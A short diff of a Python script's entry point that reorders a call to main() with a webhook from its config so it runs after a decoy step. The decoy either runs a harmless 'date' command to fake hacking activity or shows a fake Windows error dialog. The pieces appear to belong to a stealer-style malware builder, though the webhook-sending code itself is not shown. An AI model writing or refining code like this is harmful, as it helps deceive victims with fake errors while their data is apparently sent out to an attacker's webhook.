@@ -34,11 +34,11 @@ def main(webhook):
 
 
 if __name__ == '__main__':
-    main(__CONFIG__['webhook'])
-    
     if __CONFIG__['fakehack'] == True:
         os.system('cmd /c "date"') 
     else:
         if __CONFIG__['error'] == True:
             ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
+            
+    main(__CONFIG__['webhook'])
     
